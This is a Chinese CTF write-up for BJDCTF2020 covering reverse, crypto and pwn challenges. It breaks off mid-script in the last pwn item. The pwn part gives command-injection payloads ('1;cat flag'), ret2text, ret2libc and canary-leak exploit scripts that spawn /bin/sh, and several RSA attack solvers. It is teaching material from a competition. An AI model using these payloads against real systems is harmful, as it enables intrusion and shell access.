# BJDCTF2020
A CTF freshman competition organized by Hangzhou Normal University, Jiangsu University of Science and Technology, and Jiangsu University

> 不好意思咕咕咕了这么久,总算在年前改完了,web的wp其他学校的师傅已经写的很好了,这里就不再赘余了(咕咕 经过出题人长达好几天的讨论,最终决定本wp放出部分题解,有的题目介于很多原因就不放了

# web

[Y1ng师傅的wp](https://gem-love.com)

[imagin师傅的wp](https://imagin.vip)

# Android

咕咕咕

# Reverse

## 0x01 encode

### 题目思路

这道题目的大致流程为：对输入做base64编码后的结果与key分别异或，然后再以key作为密钥做RC4加密。因为这道题存在一点问题，所以后面直接根据源码给出求解思路

### RC4

关于RC4的加解密可以试试这个网站：[RC4](https://gchq.github.io/CyberChef)
此外推荐一篇看雪的关于RC4逆向分析的文章：[恶意代码分析之 RC4 算法学习](https://bbs.pediy.com/thread-256733.htm),文章写的比较详细，不过由于本题做了符号剥离，在细节处可能有略微差别。

### base64

关于base64，i春秋有一篇文章[BASE64编码原理分析脚本实现及逆向案例](https://www.cnblogs.com/ichunqiu/p/10535378.html)，不过本题中的base64码表是更改过的，需要特别注意一下。

### 解题过程

1. upx脱壳
2. 根据密钥和密文通过RC4解密得到：`23152553081a5938126a3931275b0b1313085c330b356101511f105c`
3. 和key异或得到base64编码
4. base64解密

   ```python
        from base64 import b64decode

        key = 'Flag{This_a_Flag}'
        enflag = '23152553081a5938126a3931275b0b1313085c330b356101511f105c'
        enflag = [int(enflag[i:i+2],16) for i in range(0,len(enflag),2)]
        enflag = [chr(enflag[i]^ord(key[i%len(key)])) for i in range(len(enflag))]
        enflag = ''.join(enflag)
        print(enflag)

        t = '0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ='
        table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        table = str.maketrans(t,table)
        flag = b64decode(enflag.translate(table))
        print(flag)
    ```

5. 题目源码

    ```c++
        // main.c
        #include<stdio.h>
        #include<string.h>
        #include<stdlib.h>
        #include<unistd.h>
        #include"RC4.h"

        unsigned char *base64_encode(unsigned char *str);

        int main(void)
        {   unsigned char key[] = "Flag{This_a_Flag}";
            unsigned int len0 = strlen((const char *)key);
            unsigned int i;
            unsigned char res[]="e8d8bd91871a010e560f53f4889682f961420af2ab08fed7acfd5e00";
            // unsigned char buf[]="BJD{0v0_Y0u_g07_1T!}";
            unsigned char buf[128];
            printf("Please input your flag:\n");
            read(STDIN_FILENO,buf,256);
            if(strlen(buf)!=21)
                exit(0);
            else
            {
                unsigned char inputs[30];
                strcpy(inputs,base64_encode(buf));
                unsigned int len=strlen((const char*)inputs);
                for(i=0;i<len;i++)
                    inputs[i]^=key[i%len0];
                printf("\n");
                rc4_crypt(inputs,len,key,len0);
                if(!strcmp(inputs,res))
                    exit(0);
                else
                    puts("right!");
            }
            return 0;
        }

        unsigned char *base64_encode(unsigned char *str)  
        {  
            long len;  
            long str_len;  
            unsigned char *res;  
            int i,j;  
            unsigned char *base64_table="0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

            str_len=strlen(str);  
            if(str_len % 3 == 0)  
                len=str_len/3*4;  
            else  
                len=(str_len/3+1)*4;  

            res=malloc(sizeof(unsigned char)*len+1);  
            res[len]='\0';  

            for(i=0,j=0;i<len-2;j+=3,i+=4)  
            {  
                res[i]=base64_table[str[j]>>2];
                res[i+1]=base64_table[(str[j]&0x3)<<4 | (str[j+1]>>4)];
                res[i+2]=base64_table[(str[j+1]&0xf)<<2 | (str[j+2]>>6)];
                res[i+3]=base64_table[str[j+2]&0x3f];
            }  

            switch(str_len % 3)  
            {  
                case 1:  
                    res[i-2]='=';  
                    res[i-1]='=';  
                    break;  
                case 2:  
                    res[i-1]='=';  
                    break;  
            }  

            return res;  
        }

        // RC4.c
        #include <string.h>

        static void rc4_init(unsigned char* s_box, unsigned char* key, unsigned int key_len)
        {
            unsigned char Temp[256];
            int i;
            for (i = 0; i < 256; i++)
            {
                s_box[i] = i;
                Temp[i] = key[i%key_len];
            }
            int j = 0;
            for (i = 0; i < 256; i++)
            {
                j = (j + s_box[i] + Temp[i]) % 256;
                unsigned char tmp = s_box[i];
                s_box[i] = s_box[j];
                s_box[j] = tmp;
            }
        }

        void rc4_crypt(unsigned char* data, unsigned int data_len, unsigned char* key, unsigned int key_len)
        {
            unsigned char s_box[256];
            rc4_init(s_box, key, key_len);
            unsigned int i = 0, j = 0, t = 0;
            unsigned int Temp;
            for (Temp = 0; Temp < data_len; Temp++)
            {
                i = (i + 1) % 256;
                j = (j + s_box[i]) % 256;
                unsigned char tmp = s_box[i];
                s_box[i] = s_box[j];
                s_box[j] = tmp;
                t = (s_box[i] + s_box[j]) % 256;
                data[Temp] ^= s_box[t];
            }
        }

        // RC4.h
        #ifndef RC4_H
        #define RC4_H

        void rc4_crypt(unsigned char* data, unsigned int data_len, unsigned char* key, unsigned int key_len);

        #endif
    ```


## 0x02 Easy

![easy1](/image/easy1.png)

拖进IDA查看伪代码，发现主函数内没有任何与flag有关的函数，F12搜索字符串也找不到太多有用的信息。但是在函数窗口可以发现一个叫ques的未被调用的函数。

对ques函数的逻辑进行简单的静态分析可以发现，这个函数的作用其实就是把数组[0x224fc7ffa7e31，0x22a84884a4239 , 0x3ff87084ff235 , 0x2318588424233 , 0x231fc7e4243f1]
里的每个元素先转换为二进制，转换的过程中遇到1就输出*，遇到0就输出一个空格。数组的第0个元素对应输出的第0行，第1个元素对应输出的第1行…不难发现，最终输出组合而成的象素图案就是对应的flag。

***当然你也可以在发现了这个后门函数后直接动态调试+修改eip跳转到ques函数的起始地址，一路F8或者下断+F9就可以直接得到flag。

![easy2](/image/easy2.png)
 
BJD{HACKIT4FUN}

## 0x03 BJD hamburger competition

在BJD hamburger\BJD hamburger competition_Data\Managed文件夹中找到Assembly-CSharp.dll拖进Dnspy中，找到 ButtonSpawnFruit这个类。

![hum1](/image/hum1.png)
 
可以看到，需要我们按照正确的顺序堆出汉堡才能得到正确的flag。并且在汉堡顶的判断中限制了spawncount必须为5，又因为spawncount从0开始，所以汉堡的层数只能是6.
除去汉堡底和汉堡顶，还剩4种材料，因此这道题就转化成了从7种材料中选4种的问题。

![hum2](/image/hum2.png)
 
得出结果所有可能情况：![hum3](/image/hum3.png) ，以及result的值为‘1001’
把result进行MD5加密后，取前20位。

![hum4](/image/hum4.png)
 
Flag：BJD{B8C37E33DEFDE51CF91E}
PS:这里也可以用itertools模块中的permutations方法求解。

还有一种比较简单的解法，在老八做汉堡的原视频中，老八堆汉堡的顺序是：汉堡底-生菜-臭豆腐-俘虏-加柠檬-汉堡顶，在上文脚本中对应的顺序为5347，同样可以得出最终的result为1001.


btw这道题出现了非预期解：如果直接把这一串哈希值放进在线SHA1解密网站可以直接得到明文为1001，算是出题人的出题的时候不够严谨导致的，在这里给大家说声抱歉…（我暴打我自己）。



# Programing

3道题目均可暴力求解

## 0x01 Every minute counts
简单BFS，依次尝试所有可能转换到的位置即可

## 0x02 Pyramid
找规律
打表找下规律，打表方法：把所有点扔坐标系里n^3爆搜即可
打出来为 1，5，15，35，70，126，210..
没感觉，作差 4, 10, 20, 35, 56, 84
还是没感觉，作差 6, 10, 15, 21, 28
发现此时的差递增1？也就是再作差4, 5, 6, 7是等差数列
也就是再作差1, 1, 1为常数
相当于函数An求四次导为常数
于是我们设An=a∗n4+b∗n3+c∗n2+d∗n+e
解出a, b, c, d, e，带入得答案

## 0x03 Real Hero
建立一个虚结点，并将其与超人所有人相连，且距离为0，这样问题就转换成了求两次点到城中其他点最短路径的最大值，然后比较一下即可
注意路径去重



# Crypto

## 0x01 Sign_in

十六进制转字符串即可

## 0x02 编码与调制

本题灵感来自2019年第三届i春秋的11月月赛，主要是想对曼切斯特编码进行考察，其中为了提供一下思路，给了一张code的图片作为提示，当然也可以直接自行百度这种编码方式，毕竟他的编码方式也很有特点，仅采用了4种字符，百度一下也可以找到解决方案
编码规则，直接复制的百度百科
在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“1”，从低到高跳变表示“0”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。
编程思路：
而我们在编程实现时，也很简单只要先将明文转成二进制（也就是先进行NRZ编码），而后对于其中的高电平‘1’，用‘10’替换，低电平‘0’，用‘01’替换，获得一串新的二进制比特流，最后再将其进行16进制封装即可
解码思路：
解码也就是一个逆过程，先将hex转成bin，在一步步替换‘10’为‘1’，‘01’为‘0’
下面给出解密脚本：

```
msg=0x2559659965656a9a65656996696965a6695669a9695a699569666a5a6a6569666a59695a69aa696569666aa6
s=bin(msg)[2:]
r=""
for i in range(len(s)/2):
    if s[i*2:i*2+2] == '10':
        r += '1'
    else:
        r += '0'
print(hex(int(r,2))[2:-1].decode('hex'))

```


最终flag：
BJD{DifManchestercode}

## 0x03 Polybius

密文：ouauuuoooeeaaiaeauieuooeeiea
hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=
首先将hint base64解密查看提示：The length of this plaintext: 14
而后再观察一下发现密文长度时28位，所以猜测是棋盘密码（额，其实题目就已经提示加密方式了）
观察发现一共有五个字母重复出现在密文中，所以可能的加密表是aeiou，但是解出结果会发现是乱码，所以可以尝试爆破，一共也就5！种情况。
下面是解密脚本：


```
import itertools

key = []
cipher = "ouauuuoooeeaaiaeauieuooeeiea"
for i in itertools.permutations('aeiou', 5):
    key.append(''.join(i))
for each in key:
    temp_cipher = ""
    result = ""
    for temp in cipher:
        temp_cipher += str(each.index(temp))          
#这里其实是将字母的表换成数字的表以便后续计算
    for i in range(0,len(temp_cipher),2):
        current_ascii = int(temp_cipher[i])*5+int(temp_cipher[i+1])+97     
#因为棋盘密码是采用两位一起表示一个字母
        if current_ascii>ord('i'):
            current_ascii+=1
        result += chr(current_ascii)
    if "flag" in result:
        print(each,result)

```

跑出来两个结果：
 
显然第一个是最终答案
最后加上格式：
BJD{flagispolybius}
啊啊啊啊啊，最后说一下，这次flag设置的居然和题目名一样，大意了，
(￣ε(#￣)☆╰╮o(￣皿￣///)，导致赛后有师傅说是直接猜出来的flag，在这里给各位师傅谢罪了(。﹏。)，下次flag我会深思熟虑一下了，下次一定，下次一定


## 0x04 easyrsa


很简单的一个rsa，就是再求取欧拉函数是对于（p-1）*（q-1）的获取要先进行一步转换，题中给出了p和q的关系式，及一个求导的过程，化简后可以得出z=p^2+q^2,最后再根据n=p*q,即可得出（p-1）*（q-1）
下面是exp：

```
# -*- coding:utf-8 -*-
#!/usr/bin/python

import gmpy2
from Crypto.Util.number import long_to_bytes

n=15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441
z=32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482
c=7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035
e=65537

p_and_q_square = z + 2*n #这个要通过化简一下z就可以发现其中的关系，其实就是简单的导数化简

p_and_q = gmpy2.iroot(p_and_q_square,2)

#(mpz(250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442), True)

final_p_and_q = 250474028594377426111821218884061933467907597574578255066146260367094595399741196827532923836761733594976933366636149201492628708413319929361097646526652140204561542573663223469009835925309935515892458499676903149172534494580503088868430625144808189083708827363335045028702993282231537893799541685169911232442

Euler_function = n - final_p_and_q + 1
 
d = int(gmpy2.invert(e,Euler_function))

m=pow(c,d,n)

print(long_to_bytes(m))
```

## 0x05 rsa_output

题目描述直接给出，模的相关攻击，再看一下给出的附件，发现两次的N是相同的，所以可以确定是共模攻击

![共模攻击][/image/modtogether.jpg]

Exp:

```
from Crypto.Util.number import long_to_bytes
import gmpy2
n = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111
e1 = 2767

e2 = 3659

message1 = 20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599

message2 = 11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227
# s & t
gcd, s, t = gmpy2.gcdext(e1, e2)
if s < 0:
    s = -s
    message1 = gmpy2.invert(message1, n)
if t < 0:
    t = -t
    message2 = gmpy2.invert(message2, n)
plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n
print(plain)
print(long_to_bytes(plain))

```

## 0x06 RSA

这里主要操作是对于e和p的获取，可以看到题中e未知，但是给出了e的范围，并且还有用e加密294后的结果，所以可以尝试去爆破得到e
得出e之后，剩下的问题就是对于n的分解从而得到p,q，很明显直接分解肯定不可能，但是我们可以看到这里q是一个公因数，前后两次加密种只有在一开始时定义了q，所以对于两次的n去取他们的公因数即可获得q，而后再用n除以下q就可得到p

```
import gmpy2
from Crypto.Util.number import *

#e的求解:
#爆破一下就行了

'''
n=13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037
t=381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018
for i in range(0,100000):
    if(pow(294,i,n)==t):
        print(i)
'''

c = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120
n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037
e = 52361
n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047
q=GCD(n1,n2)
p=n1/q
d=int(gmpy2.invert(e,(p-1)*(q-1)))
flag=pow(c,d,n1)
flag=long_to_bytes(flag)
print(flag)
```

## 0x07 这是base？？

这题主要是对于base64编码方式的理解，题中给出一个码表和密文，解题思路就是利用给出码表，解码即可，此外，这题怪我原本打算只给出码表的键值，一时疏忽把码表直接粘到附件了，下面是我原本的预期解：
首先是根据键值构造码表：

```
ss='JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/='
k=[]#构造键列表
for i in range(0,65):
    k.append(i)
v=[]#构造值列表
for i in range(len(ss)):
    v.append(ss[i])
#用键值列表构造字典
table = dict(zip(k,v))
print(table)
```

得到码表后，就是根据码表解密文：
这里顺带提一下base64的加密流程
1、将待转换的字符串每三个字节分为一组，每个字节占8bit，那么共有24个二进制位。
2、将上面的24个二进制位每6个一组，共分为4组。
3、在每组前面添加两个0，每组由6个变为8个二进制位，总共32个二进制位，即四个字节。
4、最后再根据码表进行编码
简单来说转换关系就是先将明文的字符串的ASCII码转换为8位的二进制编码，然后在将这串得到的二进制编码按6位为一组（64是2的6次方），然后将划分好的二进制数转换成10进制数并对照上方编码表进行加密。
而相对的解密就是将这编码在按8位为一组划分，再将划分好的二进制数转成10进制的ASCII码，然后根据ASCII码表恢复明文。
Ps.这里我们可以看到转成的二进制数的长度必须是6和8的公倍数，对于那些长度不够的要进行补齐操作，详细的过程这里就不细讲了，看下面这篇文章吧
[https://blog.csdn.net/wo541075754/article/details/81734770](https://blog.csdn.net/wo541075754/article/details/81734770)
剩下的工作，也就是这次比赛中获取flag的脚本流程如下：

1、先获取密文再码表中键值

```
key_list=[]
value_list=[]
s='FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'
mydisc = {0: 'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V', 10: 'z', 11: 'A', 12: 'B', 13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H', 19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I', 25: 'a', 26: 'b', 27: 'c', 28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h', 33: 'i', 34: 'j', 35: 'k', 36: 'l', 37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3', 46: '4', 47: '5', 48: '6', 49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p', 55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v', 61: 'w', 62: '+', 63: '/', 64: '='}
for key,value in mydisc.items():
    key_list.append(key)
    value_list.append(value)
def value_to_key(a):
    get_value = a
    if get_value in value_list:
        get_value_index = value_list.index(get_value)
    else:
        print("你要查询的值%s不存在" %get_value)
    return(get_value_index)
if __name__ == '__main__':
    ss=[]
    for i in s:
        ss.append(value_to_key(i))
    print(ss)
```

2、将键值转换成六位二进制，不足位填充

```
ss=[16, 36, 41, 4, 30, 52, 16, 48, 23, 53, 36, 48, 29, 21, 61, 43, 19, 38, 61, 23, 23, 53, 17, 40, 12, 23, 13, 31, 24, 35, 17, 51, 25, 21, 61, 45, 24, 23, 1, 61]
bin_new=[]
for i in ss:
    bin_new.append(bin(i)[2:])

print(bin_new)

bin_new=['10000', '100100', '101001', '100', '11110', '110100', '10000', '110000', '10111', '110101', '100100', '110000', '11101', '10101', '111101', '101011', '10011', '100110', '111101', '10111', '10111', '110101', '10001', '101000', '1100', '10111', '1101', '11111', '11000', '100011', '10001', '110011', '11001', '10101', '111101', '101101', '11000', '10111', '1', '111101']
temp=[]
for i in bin_new:
  if len(i)<6:
    i = (6-len(i))*'0'+ i
  else:
    i = i
  temp.append(i)
print(temp)
#temp=['010000', '100100', '101001', '000100', '011110', '110100', '010000', '110000', '010111', '110101', '100100', '110000', '011101', '010101', '111101', '101011', '010011', '100110', '111101', '010111', '010111', '110101', '010001', '101000', '001100', '010111', '001101', '011111', '011000', '100011', '010001', '110011', '011001', '010101', '111101', '101101', '011000', '010111', '000001', '111101']
```

3、将获得的六位二进制拼接后按8位拆分转为ASCII码后获得flag

```
#temp=['010000', '100100', '101001', '000100', '011110', '110100', '010000', '110000', '010111', '110101', '100100', '110000', '011101', '010101', '111101', '101011', '010011', '100110', '111101', '010111', '010111', '110101', '010001', '101000', '001100', '010111', '001101', '011111', '011000', '100011', '010001', '110011', '011001', '010101', '111101', '101101', '011000', '010111', '000001', '111101']
r=''
for i in temp:
    r+=i
rr=re.findall(r'.{8}',r)
print(rr)

rrr=[]
for i in rr:
    rrr.append(int(i,2))

flag=''
for i in rrr:
    flag+=chr(i)

print(flag)

```


# Pwn


## 0x01 babyrouter

签到题

**考点:命令执行**

拖进64位IDA,直接F5 main,然后可以看到case 1:

```
     case 1:
        puts("Please input the ip address:");
        read(0, &buf, 0x10uLL);
        v3 = &buf;
        strcat(dest, &buf);
        system(dest);
        v4 = "done!";
        puts("done!");
        break;
```

发现并未过滤传入system的参数,因此直接命令执行即可..完全不用写脚本

payload 如下:
```
1
1;cat flag
```

当然还有很多方式,这里就不一一列举了


## 0x02 babystack

签到题*2

**考点:ret2text**

拖进IDA 64,F5

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, &buf, (unsigned int)nbytes);
  return 0;
}
```

发现程序可以自主控制输入的长度,栈溢出实锤,并且给了后门函数backdoor,直接Ret2text即可

payload:

```
from pwn import *

p=process('ret2text')
sys=p64(0x4006e6)
p.sendline('-1')
payload='a'*0x10+'a'*8+sys

p.sendline(payload)
p.interactive()

```

当然,不想写脚本可以直接python -i一行解决

## 0x03 babyrop

**考点:ret2libc,无libc文件如何查找版本**

直接看漏洞函数

```
ssize_t vuln()
{
  char buf; // [rsp+0h] [rbp-20h]

  puts("Pull up your sword and tell me u story!");
  return read(0, &buf, 0x64uLL);
}
```

可以用puts函数泄露libc基址,之后控制程序回到vuln函数调用system("/bin/sh")函数

libc版本可以使用libcsearcher 

payload:

```
from pwn import *
from LibcSearcher import LibcSearcher
p=process('./pwn')
#p=remote('222.186.56.247',8123)
elf=ELF('./pwn')

vuln=p64(elf.symbols['vuln'])
puts=p64(elf.plt['puts'])
libc_main=p64(elf.got['__libc_start_main'])
pop_rdi_ret=p64(0x400733)

payload1='a'*0x28+pop_rdi_ret+libc_main+puts+vuln

p.recvuntil('story!\n')
p.sendline(payload1)
libc_start_main_addr=u64(p.recvuntil('\n',drop=True).ljust(8,"\x00"))
log.success('[*]__libc_start_main:'+hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('[*]system:'+hex(system_addr))
log.success('[*]binsh:'+hex(binsh_addr))

payload2='a'*0x28+pop_rdi_ret+p64(binsh_addr)+p64(system_addr)
p.recvuntil('story!\n')
p.sendline(payload2)
p.interactive()
```


## 0x04 babystack2.0

在ret2text的基础上加了整数溢出,本来想考短整型的,但是发现第一天情况不太理想(2333

**考点:整数溢出**


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (signed int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, &buf, (unsigned int)nbytes);
  return 0;
}
```

可以看到虽然有一个条件判断是nbytes>10就会退出程序,但是在read函数中第三个参数是无符号型

此时我们可以输入-1来构造一个回环使得我们输入的值位int64的最大值

payload:

```
from pwn import *

p=process('ret2text')

sys=p64(0x4006e6)
p.sendline('-1')
payload='a'*0x10+'a'*8+sys

p.sendline(payload)
p.interactive()

```

## 0x05 babyrop2

在ret2libc的基础上增加了canary保护

**考点:泄露canary**

首先看下gift函数

```
unsigned __int64 gift()
{
  char format; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("I'll give u some gift to help u!");
  __isoc99_scanf("%6s", &format);
  printf(&format);
  puts(byte_400A05);
  fflush(0LL);
  return __readfsqword(0x28u) ^ v2;
}
```

一个标准的格式化字符串漏洞,我们的canary就可以通过gift函数来泄露,然后在我们正常的ret2libc的payload中加上我们泄露出的canary即可绕过canary检查

关于如何泄露canary,我们即然给了格式化字符串漏洞,通过调试可以发现canary在栈的第7个位置,因此可以直接用%7$p泄露

```
from pwn import *
from LibcSearcher import LibcSearcher

p=process('./pwn')
elf=ELF('./pwn')

vuln=p64(0x400887)
puts_addr=elf.plt['puts']
libc_start=elf.got['__libc_start_main']

pop_rdi_ret=p64(0x400993)

payload1="%7$p"

p.recvuntil('u!\n')
p.sendline(payload1)
canary=eval(p.recvuntil("\n",drop=True))
log.success('[*]canary:'+hex(canary))

payload2='a'*24+p64(canary)+'a'*8+pop_rdi_ret+p64(libc_start)+p64(puts_addr)+vuln
p.recvuntil('story!\n')
p.sendline(payload2)

libc_start_main_addr = u64(p.recvuntil("\n",True).ljust(8,"\x00"))
#libc_start_main_addr = p.recvuntil("\n",True).ljust(8,"\x00")
#print(libc_start_main_addr)
#pause()
log.success('[*]__libc_start_main:'+hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('[*]system:'+hex(system_addr))
log.success('[*]binsh:'+hex(binsh_addr))


payload3='a'*24+p64(canary)+'a'*8+pop_rdi_ret+p64(binsh_addr)+p64(system_addr)
p.sendlineafter('story!\n',payload3)
p.interactive()

```

## 0X06 dizzy

尝试逆开文件观察程序逻辑，可以发现首先输入被利用scanf读到一个数组里面，解析为int类型，然后对每一个数加上了114514这个数进行偏移，最后将读入的这个数组作为字符串与“PvvN| 1S S0 GREAT!”进行比较，如果相同就可以获取shell，则编写python脚本，对该字符串进行反向操作即可，下面是exp

```
from pwn import *

sh = process('./dizzy')
#sh = remote('x', 'xx')

pattern = b"PvvN| 1S S0 GREAT!;/bin/sh\0"

cnt = 0
payload = b''
buf = b''
for pat in pattern:
    #print(buf)
    buf += bytes([pat])
    if len(buf) == 4:
        cnt += 1
        sh.sendline(bytes(str(u32(buf) - 114514), encoding = 'utf-8'))
        print(u32(buf)-114514)
       # print(hex(u32(buf)))
        buf = b''

while len(buf) < 4:
    buf += b'\0'

sh.sendline(bytes(str(u32(buf) - 114514), encoding = 'utf-8'))
print(u32(buf) - 114514)
#print(hex(u32(buf)))

while cnt < 19:
    print(0-114514)
    sh.sendline(bytes(str(0 - 114514), encoding = 'utf-8'))
    cnt += 1
sh.interactive()
```

## 0X07 encryptde stack

简单的栈溢出，不过前面加上了RSA加密，提示需要输入一个加密后的值，于是到程序中找相关逻辑，其中可以发现在0x00400a70地址处有一个求逆元的函数，可以联想到RSA，每次程序生成一个随机数，输入的值加密后需要等于随机数，观察可得RSA的两个参数E、N分别为65537和94576960329497431，于是尝试分解N可以得出私钥，对m用私钥进行加密即可过掉开头的身份验证，然后就是使用return2libc的栈溢出手段即可拿到shell，下面为exp

```
from pwn import *
from LibcSearcher import *

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-v']
elf = ELF('./encrypted_stack')
pop_rdi_addr = 0x40095a
vlun_addr = 0x40093a

